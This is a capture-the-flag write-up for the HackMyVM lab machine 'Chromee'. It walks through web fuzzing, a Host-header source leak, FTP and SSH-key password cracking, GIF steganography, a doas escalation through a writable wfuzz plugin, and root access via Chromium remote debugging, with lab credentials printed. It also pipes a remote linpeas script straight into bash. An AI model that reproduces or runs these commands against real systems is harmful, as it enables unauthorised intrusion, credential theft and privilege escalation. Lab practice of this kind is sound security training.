# Writeup



## Recon

::: details nmap_scan.log
```log
Open 10.0.2.50:22
Open 10.0.2.50:80
Open 10.0.2.50:8080
Open 10.0.2.50:23333
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.50

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP4OvUJ0xKoulS7xOYz1485bm/ZBVN/86xLQvh7Gqa1DmEWz/eHP2C3MJQnqTFPOEh18FULOzj9fiehyzhd6CM7+qBZ/4B9b5RkOx7AL+S3aRIey4qQj7/k72PqMBkyfD2krjNOg7ZZe8z9o0A4VyeDljG6ukVFeN6PEtWWtdmmnVJztgzX0wPWPaO9GM5hITyvpIB/Y/IqueYR+ft2n5ROLLUfjFLezB+zSa6xkDPGiY9qMZBMXA/6oaaD3TV1x6jfTtZi+Aca0scDfOTJUVlSwZYaHrJQSNlKFJhniucqq/zxOnMIHjs/v1YXYCh0jlYDsb5J/NqTzEPMKkbtwn97T5/FQvsWDGJFTtxvCCrInmnUHB+cG8dSRYQZ763QoPxF/feDSNbrKjTv8D1K2EPhf1rBGQGIObgatVHNFclVWfuq7sn4x9olNnbsEogIQ5mbEq0mBlgOW5vowFxUkI60Ond4Dl7H4fkCeiPfngWFrT+6cQoNgA3HRKf6NtQeYs=
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNDNbes4gKOy7nXoXxW1kPwOX/vuxNkae5WSrIFu+ZD8OUIX5OK8e6o7IZDJAxn/ACAJL9Mm+tA44syyemA6C40=
|   256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINItrDSHbBfPB1CJosqklAQXN4/Mt++ocUqbiG861ZSG
80/tcp    open  http    syn-ack nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: primary
8080/tcp  open  http    syn-ack Apache httpd 2.4.56 ((Debian))
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.56 (Debian)
23333/tcp open  ftp     syn-ack vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

![writeup.png](/assets/pentest/hackmyvm/chromee/writeup.png)

### Fuzzing

Hidden files ay? ğŸ¤¨
```bash
â””â”€$ feroxbuster -u http://chromee.hmv -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php -W 28
200      GET      167l      334w     4464c http://chromee.hmv/
200      GET        1l        1w        3c http://chromee.hmv/post.php
200      GET        7l        9w      171c http://chromee.hmv/secret.php
```

Suspicious
```bash
â””â”€$ curl 'http://chromee.hmv/secret.php' -s | html2markdown
# æ™šä¸Šå¥½ï¼Œadriana

å½“å‰æ—¶é—´ï¼š2025-09-09 19:34:22

ä½ çš„IPï¼š10.0.2.15
```

Fuzz headers?
```bash
â””â”€$ ffuf -u 'http://chromee.hmv:8080/' -H 'FUZZ: 1' -w /usr/share/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers -mc all -fs 33
Expect                  [Status: 417, Size: 432, Words: 40, Lines: 15, Duration: 3ms]
Host                    [Status: 400, Size: 303, Words: 26, Lines: 11, Duration: 4ms]
If-Match                [Status: 412, Size: 0, Words: 1, Lines: 1, Duration: 6ms]
```

Source code is disclosed with `Host` header
```php
â””â”€$ curl http://chromee.hmv/secret.php -H 'Host: 127.0.0.1'
<!DOCTYPE html>
<html>
<head>
    <title>Secret</title>
</head>
<body>
    <?php
    $greeting = date('H') < 12 ? 'æ—©ä¸Šå¥½' : (date('H') < 18 ? 'ä¸‹åˆå¥½' : 'æ™šä¸Šå¥½');
    $visitorIP = htmlspecialchars($_SERVER['REMOTE_ADDR']);

    echo "<h1>{$greeting}ï¼Œadriana</h1>";
    echo "<p>å½“å‰æ—¶é—´ï¼š" . date('Y-m-d H:i:s') . "</p>";
    echo "<p>ä½ çš„IPï¼š{$visitorIP}</p>";
    if (isset($_GET['aaa'])) {
        $file_content = file_get_contents('/opt/note/dic.txt');
        echo $file_content;
        } else {
                die();
        }
    ?>
</body>
</html>
```

Some kind of note
```bash
â””â”€$ curl 'http://chromee.hmv/secret.php?aaa' -s | html2markdown
# æ™šä¸Šå¥½ï¼Œadriana

å½“å‰æ—¶é—´ï¼š2025-09-09 19:33:44

ä½ çš„IPï¼š10.0.2.15

The Lost Key Lily, a curious girl, found an old rusty key in the woods.
Wondering where it belonged, she asked everyone in the village, but no one
knew. One day, she discovered a locked stone well. To her surprise, the key
fit. She opened it and descended into a hidden passage. There, she found an
ancient chest filled with treasures. But the real treasure was a note inside:
â€œThe greatest treasure is the journey, not the prize.â€ Lily smiled, realizing
the adventure was the real reward.
```

Some kind of endpoint that returns Data as Json?
```bash
â””â”€$ curl 'http://chromee.hmv/post.php' -d 'x=1'
{"x":"1"}

â””â”€$ curl 'http://chromee.hmv/post.php' -d 'y=1'
{"y":"1"}

â””â”€$ curl 'http://chromee.hmv/post.php' -d 'y[]=1'
{"y":["1"]}
```

Hmmm... can't make sense of it. 

1. We have some kind of **note** file
2. Potential usernames: **Adriana** and **lily**

## HTTP (8080)

```bash
â””â”€$ curl 'http://chromee.hmv:8080/'
<h2>You may need to bypass!</h2>
```

```bash
â””â”€$ feroxbuster -u http://chromee.hmv:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n
200      GET        1l        5w       33c http://chromee.hmv:8080/
301      GET        9l       28w      322c http://chromee.hmv:8080/javascript => http://chromee.hmv:8080/javascript/
403      GET        9l       28w      278c http://chromee.hmv:8080/silence
```

```bash
â””â”€$ nomore403 -u http://chromee.hmv:8080/silence/ -f /opt/nomore403/payloads --http | grep -E '^(200|302)'
200                871 bytes POST
200                181 bytes OPTIONS

â””â”€$ curl http://chromee.hmv:8080/silence/ -X POST -s | html2markdown
# Silence

We are working to improve our website.

contact: support@chromee.hmv
```

All that for a domain name which we already added for simplicity ğŸ˜¶

No subdomains found...
```bash
â””â”€$ domain='chromee.hmv'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -fs 0,4464
â””â”€$ domain='chromee.hmv'; ffuf -u "http://$domain:8080/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -fs 0,33
```

## FTP

`dic.txt` is most likely a hint for brute-force. With `cupp` script we can actually utilize given file and turn it into a wordlist to bruteforce. There's also FTP opened so we can try that before SSH.
```bash
â””â”€$ sudo git clone https://github.com/Mebus/cupp.git /usr/local/share/cupp
â””â”€$ sudo ln -s /usr/local/share/cupp/cupp.py /usr/local/bin/cupp
â””â”€$ curl 'http://chromee.hmv/secret.php?aaa' -s | grep Lily > dic.txt
â””â”€$ cupp -w ./dic.txt
> Do you want to concatenate all words from wordlist? Y/[N]:
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:
[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to ./dic.txt.cupp.txt, counting 1545 words.
> Hyperspeed Print? (Y/n) :
[+] Now load your pistolero with ./dic.txt.cupp.txt and shoot! Good luck!

â””â”€$ hydra -l adriana -P dic.txt.cupp.txt chromee.hmv ftp -s 23333
[23333][ftp] host: chromee.hmv   login: adriana   password: Lily2020
```

There's a hidden file, 3 dots. Tricky..
```bash
â””â”€$ sshpass -p Lily2020 ftp adriana@chromee.hmv -P 23333
ftp> ls -lah
229 Entering Extended Passive Mode (|||9759|)
150 Here comes the directory listing.
drwxr-xr-x    2 106      115          4096 Mar 09  2025 .
drwxr-xr-x    4 0        0            4096 Mar 09  2025 ..
-rw-r--r--    1 0        0            3414 Mar 09  2025 ...
-rw-r--r--    1 0        0             495 Mar 07  2025 dic.txt
226 Directory send OK.
ftp> get ...

ftp> pwd
ftp> cd /home
ftp> ls
drwxr-x---    4 1000     1000         4096 Mar 09  2025 follower
drwxr-x---    3 1001     1001         4096 Mar 07  2025 softly
```

## SSH

```
â””â”€$ file ...
...: OpenSSH private key
â””â”€$ mv ... id_rsa
â””â”€$ chmod 600 id_rsa
â””â”€$ ssh-keygen -lf id_rsa
4096 SHA256:x4DDD6BCwxJUp0gbtPHeQ3bWKjfY4/5y610LQa4DmYg no comment (RSA)
```

```bash
â””â”€$ ssh -i id_rsa softly@chromee.hmv
Warning: Permanently added 'chromee.hmv' (ED25519) to the list of known hosts.
softly@chromee.hmv: Permission denied (publickey).

â””â”€$ ssh -i id_rsa follower@chromee.hmv
Warning: Permanently added 'chromee.hmv' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```

```bash
â””â”€$ ssh2john id_rsa | tee id_rsa.hash
id_rsa:$sshng$6$16$7bd1b98554a10c064fc8cb31d919e3d9$2470$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107bd1b98554a10c064fc8cb31d919e3d9000000180000000100000217000000077373682d727361000000030100010000020100bd202af95ffc173cfce0b591a407d648aefaff916e50c29598a60410ef5286a5d983921fb58b9c09ffa6e08f00ceefbbb39ecf399f024f24a6006057699f61a2119142f9cdc319bd2d8ee6e8f7d03d38e32bd88404f262e429b9ed8048b02790c1c7687dc79214860cba21ca98f1bb2ba1e5b29af3fff91b60d65d015daada399cd24a78655adc6ef7c36204ed60606402e4b709f48ac6a8c47f12948e65f85a9ae36fa7458b5bd4343d5c64621c4b255f67d74fbc46a904e62258c5bf77c06b393ff727104cff885224acd521cd781350f51e1e92f6410dd6ce120e97f8b31da805f80de48daf93c0ea971298f769b1fae08fc2923201f1f10fd04af1eae7e0b08c49e5a74e8a8f647ec92746862f6f5d97a56559ef7acfb0b83bc86d5a8672e1935aba56d80c1be3d6afa1ef9f7970c53da887c5412beb2d6ad74fda3ac1b48d92f0e049d1aae7a4656d4b20f5e1be48c5267540bfe97d9ddd3407a6841aed9b9c62ccd21c1ad46f6a6c31779698f8daea50c66dcab03a7a9aae438cc7646d2bb7e1b4e33beee5ba11fb79a630bb6eaf35ab67ee6c912b91a29e1afb4952693ae7a58591f549052fc712190d8aa91b2624395d005aef58411cd6344b54bb3a6860278e84bd948d24c028865ba84281a19e3575cbaba4e3e344356776c8cc6fe8c859e1533d872cef285b9d9263933b64db549879fc3577b75903448709d7db000007408e7146ffae26e19eebbe42b0ec7a9f08af4054059bdb96063773b0bd5d832ab94cddb39175a332fa33cc5568446325098f832db46d44afcd2fd1066fb571e9f268e71ab39904cf1728ae492ddb12d807fa011b8750d529c8d08ffff4408c00ea51559e231e6eb2ff995d0348024eb0797c33f4f560d1bc578a0964328641c4329ca46b4ada0f2b2d866a480bf85a32ecce40bfcdf9a210579616ace0396f25bd54587909dfb982059f13bb9024a09ae087992c44a13ee6a3395d94425ffe5bb214b0f049f5b49f732414913de3f142350a3730efbb00ba8ffe3b32bcbbf7433945d4d922681b2024734d49f1ef44d80cc33426fabd3b903c30d58db21b0b27bbab9cebe42f06380bb2c30e64a41afc3856bf6d3c26b797fa83ed305b054e0e534ccffcdfd7b4ab175d567d683756ac8494cbd629817c27be09875bfc8dcba0a67f01ef61edca47aa736abba9a7b94122c103bea8d2c9e3c2c754b40ebcdb3fabcb0469a95acdaada889668b10a58490af1edc69b7f5e38027eeda5975c929291ae47accdad89ae14c4383f9889be504f724e6bb82ff4a5525dc6dafde42400fea24de2922253f30077fad9b72eb3e43726c297de13e7fbf4514ba1e8415514fab5750fdaf98e022122ffc796f0b8cc3e30fc80050ad5497a76afca9577a4fc1aecef813cf9f6e49c4ca9a944f7e6e1415f0a4989e9e8c0313a825400cd6ea106e1fcef577721f0de60192d08dcf36e790b55f521a1c79e311289e6e71f7a07ad8ce26866300b6d460f36c0851e077f637d55044fa2a08dcd77f7a155108cdd96c7a84c963cdb2c45658da0a343a5678cbbde8f3a599e8932de83af26c90734dc83d9083a6d0dd6a466c7a43883d5904c50aec22ce921fb356143025b1f1dd884f39c92441bfebc9602b6e93b033fb4b0f55dc236f412fa95d143dccf2dfa1449bba18e88018de1b2e8ceb230323ae7dbf91938b59172d42a2571ab5afd92321f244b101b1d33f1bef668cf1fea018c3910da2ea018c2f035342cb8e611e9e74ed2f7ddd2165fe32ca33206eb947e2b37c59fdf0d8e74333b8cf4d6a1b87ee1cad3cd4c23e255932a0ccab2ad7dff8e34b8ac280d8a81d66913df363ef26fadfdc2bb8fa0b60af7bbc1239391d40abfb7aab42f1848a57420c9d0636a0cd01f37b6a320113354d91f6a2007b81278fafb2ed0465dee864b8fbbcd86f7c026e136a17ae0b687c352e549fb5da83a91882ef69d2eb60e3c6efb9b267d360f928f6ac8fb4072dde4fa3506c3c24e1bdece899a969f5a8c04bfd8b5fdcb9df94b134051958a89bb2b61afecd01419b6b17f9ca7a62459511c1b7ef7b5943e0ea26384e767ea92eeea21126bce35771eeecfe9e0ff92e4a04f90c4d5f0ce51b98a451b1a2a86af43ed9a17d6fdca61bc2f75ee69861dd9cf68cdaeded6ab01d3aaed7e49d54dde61fba65f08adb9bfe7199fcfe700daf00dd8bc3295491337755f10ac83094327c7c98ca7420bc55ea82c0e8b7a3380713114445e23bbb91d31bf1a63c8038c3f035d38b72a31b768c2346ef4f2e585f23e058ef4334688e9b77f9984f2b51270e22ce52eb3485401202d48cb4aef7d3de41b5e3a8682b060569c2399bb37f99ce2cc9297e150dc1fd79c5ed85e3ad005c56e5896f81be5590f34e05d1092ba1f917810087132aab0b8b66825960a369d4d60b7dea602f8810c02a6cb29efa5fc463ee0460871239fed4824086c0d4fa3bd71b82f264ab3c7669658d6f32e8e7ce5d086bb8c0940e266a8fb7fd2d3a4dc240cd99171367728d50d9e38c3432b64907b5ea345273c6f1819040ddbd41449662f2dfcfbf62571bd8411ddb99570d8586bbe32416b4967ca31869a583308cdbfc77c336db30a77ac2fb8860e08fafe91ac1b472dc58394231f8df2fa0b97d261a896abfd13a8d39774af45c692332af8397712e33bf6a90115bb7bacd4d329f87a7fb4fed46d628c767d7a253c0d8c8272d1ab8615f9d5169859c6cb9539e4fc78ba7c2c7483d7a28ef7b451fe791f01e5cd132b4a3511074eac941d62a27066ecfefcdead40baacb0871061dac5b8fbf75418329c70f36b51ccff4833abe0427dea1e2268d91e62f80e6469521ec2d30fc6481c8c83153904d6882e9719772093888050a06e9881a059506f3b1493b0506810f69cda7e081d4c070d641683d0c6f713c638db64f45057405802173feb97c8f607902064dbb189f40c5ac92bca31122b0e5c020901e659fe1cc4df757a51ba11548929e8b119edd714a6871fe62ab27e5ebff5221b28b134a9ccc411a7a3c07474463344ad67fe526621d7e8e1a8164b780688847dd30facc9b81506f63ddf2ae55df5a27c77fe88b1e41dd889dd6e7235e2211df6f0c4e97b3fdaf56d188fc6ab772fa75b0cae2a48a95fcb2ede31320490cd34ae8112489ac009031c0f3110cd4cbfc2903aa65c21a4cd3fb875515ef38dc566bd74442e2adee11dc5f5e6c72bc8f29a80e0de9916c3ee026037ddeb53838b39d8d42b61a663743ba2530bc3976f6bb6c7bfa6790ee9c0a09c32c98298da23d56184b29024623111e0b2f081e9dd61e14429d0fb90124fddd03565ba5118b367ab6486df$24$614

â””â”€$ john id_rsa.hash --wordlist=$rockyou
cassandra        (id_rsa)

â””â”€$ ssh -i id_rsa follower@chromee.hmv
Warning: Permanently added 'chromee.hmv' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': cassandra
follower@Chromee:~$ id
uid=1000(follower) gid=1000(follower) grupos=1000(follower)
```

> **Creds**: `@id_rsa:cassandra`

## Privilege Escalation (softly)

```bash
follower@Chromee:~$ find . -type f -ls
   130868      4 -rw-r--r--   1 follower follower       96 mar  9  2025 ./note.txt
   129898      4 -rw-r--r--   1 follower follower      807 mar 27  2022 ./.profile
   129902      4 -rw-r--r--   1 follower follower      220 mar 27  2022 ./.bash_logout
   131862      4 -rw-------   1 follower follower     3434 mar  7  2025 ./.ssh/id_rsa
   131864      4 -rw-------   1 follower follower      726 mar  7  2025 ./.ssh/authorized_keys
   130039   3412 -rw-r--r--   1 root     root      3492425 mar  9  2025 ./cat.gif
   129912      4 -rw-r--r--   1 follower follower     3526 mar 27  2022 ./.bashrc
   130886      4 -rw-------   1 follower follower     1200 mar  7  2025 ./.gnupg/trustdb.gpg
   130882      4 -rw-------   1 follower follower       32 mar  7  2025 ./.gnupg/pubring.kbx

follower@Chromee:~$ cat note.txt
Think about rotations and the catâ€™s secrets.
47 is not just a number, it's a twist of fate.
```

### Steganography

```bash
â””â”€$ scp -i id_rsa follower@chromee.hmv:cat.gif .

â””â”€$ exiftool cat.gif
ExifTool Version Number         : 12.76
File Name                       : cat.gif
Directory                       : .
File Size                       : 57 kB
File Modification Date/Time     : 2025:09:09 14:42:05-04:00
File Access Date/Time           : 2025:09:09 14:42:05-04:00
File Inode Change Date/Time     : 2025:09:09 14:51:34-04:00
File Permissions                : -rw-rw-r--
File Type                       : GIF
...
Comment                         : Imagemagick Convert Timeline
...

â””â”€$ identify cat.gif
cat.gif[0]  GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.004
cat.gif[1]  GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.004
cat.gif[2]  GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.004
cat.gif[3]  GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.003
cat.gif[4]  GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.003
cat.gif[5]  GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.003
cat.gif[6]  GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.003
cat.gif[7]  GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.003
cat.gif[8]  GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.004
cat.gif[9]  GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.003
cat.gif[10] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.003
cat.gif[11] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.003
cat.gif[12] GIF 640x640 640x640+0+0 8-bit sRGB 256c 3.33064MiB 0.000u 0:00.003
```

There's 13 frames, however there's almost no difference between images.
```bash
â””â”€$ open output
â””â”€$ convert cat.gif output/frame_%03d.png
```

The frame delay looks promising, if we use rot47
```bash
â””â”€$ identify -format "%T " cat.gif
65 98 65 100 102 98 67 6 6 6 6 6 6 
```

![writeup-1.png](/assets/pentest/hackmyvm/chromee/writeup-1.png)

> **Creds**: `follower:p3p573r`

### Do As

Hmmm.. can't `sudo` or `su` as other users, password is for current user.

```bash
follower@Chromee:~$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash | tee lp.log
...
â•â•â•£ Cron jobs list
/usr/bin/crontab
...
â•”â•â•â•â•â•â•â•â•â•â•â•£ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/local/bin/doas
/usr/bin/g++
/usr/bin/gcc
/usr/bin/make
/usr/bin/nc
/usr/bin/nc.traditional
/usr/bin/netcat
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python3
/usr/bin/wget
...
â•”â•â•â•â•â•â•â•â•â•â•â•£ SUID - Check easy privesc, exploits and write perms
...
-rwsr-xr-x 1 root root 42K mar  7  2025 /usr/local/bin/doas
-rwsr-xr-x 1 root root 471K jul  2  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K ene 16  2024 /usr/lib/chromium/chrome-sandbox
...
â•”â•â•â•â•â•â•â•â•â•â•â•£ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
â•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/dev/mqueue
/dev/shm
/home/follower
/media/debug.kdbx
/run/lock
```

`doas` is alternative to `sudo`, first we need to find it's config.
```bash
follower@Chromee:~$ ls /etc/doas.conf
ls: no se puede acceder a '/etc/doas.conf': No existe el fichero o el directorio
follower@Chromee:~$ strings /usr/local/bin/doas | grep conf
usage: doas [-nSs] [-a style] [-C config] [-u user] command [args]
could not open config file %s
/srv/zeus.conf
input error reading config
parseconfig
follower@Chromee:~$ cat /srv/zeus.conf
permit follower as softly cmd /usr/local/bin/wfuzz
permit nopass :softly as root cmd /usr/bin/chromium
permit nopass :softly as root cmd /usr/bin/kill
```

The default location is in `/etc/doas.conf`, however it's missing. If you grep for `conf` files from binary you can find config.

Errr.. interesting?
```bash
follower@Chromee:~$ find /usr/ -writable -ls 2>/dev/null
   130494      4 -rw-r--rw-   1 root     root           34 mar  8  2025 /usr/local/lib/python3.9/dist-packages/wfuzz/plugins/payloads/file.py
...
follower@Chromee:~$ cat /usr/local/lib/python3.9/dist-packages/wfuzz/plugins/payloads/file.py
import pty
pty.spawn("/bin/bash")
```

```bash
follower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz -u 127.0.0.1 -z file
Password: p3p573r
softly@Chromee:/home/follower$ id
uid=1001(softly) gid=1001(softly) groups=1001(softly)
```

### User.txt

```bash
softly@Chromee:~$ cat user.txt
flag{c5dbe81aac6438c522d2f79cc7255e6a}
```

## Privilege Escalation (root)

```bash
â””â”€$ scp -i id_rsa follower@chromee.hmv:/media/debug.kdbx .
â””â”€$ file debug.kdbx
debug.kdbx: PDF document, version 1.7
â””â”€$ mv debug.kdbx debug.kdbx.pdf
```

![writeup-2.png](/assets/pentest/hackmyvm/chromee/writeup-2.png)

[https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger)

```bash
softly@Chromee:~$ doas -u root /usr/bin/chromium --headless --remote-debugging-port=9222
[0909/214509.930822:ERROR:zygote_host_impl_linux.cc(100)] Running as root without --no-sandbox is not supported. See https://crbug.com/638180.
softly@Chromee:~$ doas -u root /usr/bin/chromium --headless --remote-debugging-port=9222 --no-sandbox
softly@Chromee:~$ doas -u root /usr/bin/chromium --headless --remote-debugging-port=9222 --remote-debugging-address=0.0.0.0 --no-sandbox
[0909/214541.268458:WARNING:bluez_dbus_manager.cc(248)] Floss manager not present, cannot set Floss enable/disable.
DevTools listening on ws://0.0.0.0:9222/devtools/browser/992f9c08-b23c-4301-8d64-8a682022e521
```

No pages showed up to inspect

![writeup-3.png](/assets/pentest/hackmyvm/chromee/writeup-3.png)

Hmmm... looking at cronjob something should have happened..
```bash
2025/09/09 22:12:30 CMD: UID=0     PID=1      | /sbin/init
2025/09/09 22:13:01 CMD: UID=0     PID=29214  | /usr/sbin/CRON -f
2025/09/09 22:13:01 CMD: UID=0     PID=29215  | /usr/sbin/CRON -f
2025/09/09 22:13:01 CMD: UID=0     PID=29216  | /bin/sh -c /root/script.sh
2025/09/09 22:13:01 CMD: UID=0     PID=29217  | /bin/bash /root/script.sh
```

[Getting Started with Headless Chrome](https://developer.chrome.com/blog/headless-chrome)

Actually I was missing a flag, the URL it should open
```bash
softly@Chromee:~$ doas -u root /usr/bin/chromium --headless --remote-debugging-port=9222 --remote-debugging-address=0.0.0.0 --no-sandbox --disable-gpu http://127.0.0.1
```

![writeup-4.png](/assets/pentest/hackmyvm/chromee/writeup-4.png)

```bash
follower@Chromee:~$ su -
ContraseÃ±a: UGhhbnRvbSBFbmdhZ2UK
root@Chromee:~# id
uid=0(root) gid=0(root) grupos=0(root)
```

> **Creds**: `root:UGhhbnRvbSBFbmdhZ2UK`

### Root.txt

```
root@Chromee:~# cat /root/root.txt
flag{e96f7a29ba633b4e43214b43d1791074}
```

## P.S.

If we knew the filename we could also have dumped the script.
```
root@Chromee:~# ls /root/
node_modules  package.json  package-lock.json  root.txt  script.js  script.sh
```

```bash
softly@Chromee:~$ doas -u root /usr/bin/chromium --headless --no-sandbox --disable-gpu --dump-dom file:///root/script.js
[0909/222150.586319:WARNING:bluez_dbus_manager.cc(248)] Floss manager not present, cannot set Floss enable/disable.
<html><head><meta name="color-scheme" content="light dark"></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">const CDP = require('chrome-remote-interface');

async function sendPostRequest() {
    const client = await CDP();

    const { Network, Page, Runtime } = client;

    try {
        // å¯ç”¨ç½‘ç»œè°ƒè¯•
        await Network.enable();

        // å¯ç”¨é¡µé¢è°ƒè¯•
        await Page.enable();

        // è®¿é—®é¡µé¢
        await Page.navigate({ url: 'http://127.0.0.1:80' });
        await Page.loadEventFired();  // ç­‰å¾…é¡µé¢åŠ è½½å®Œæˆ

        console.log('Page loaded. Sending POST request...');

        // åœ¨æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œ fetch å‘é€ POST è¯·æ±‚
        const postData = JSON.stringify({ key: 'UGhhbnRvbSBFbmdhZ2UK' });

        const script = `
            fetch('http://127.0.0.1/post.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: '${postData}'
            }).then(res =&gt; res.text()).then(console.log).catch(console.error);
        `;

        // é€šè¿‡ Runtime.evaluate åœ¨æµè§ˆå™¨é‡Œæ‰§è¡Œ JavaScript ä»£ç 
        await Runtime.evaluate({ expression: script });

    } catch (err) {
        console.error('Error:', err);
    } finally {
        client.close();
    }
}

sendPostRequest();

</pre></body></html>
```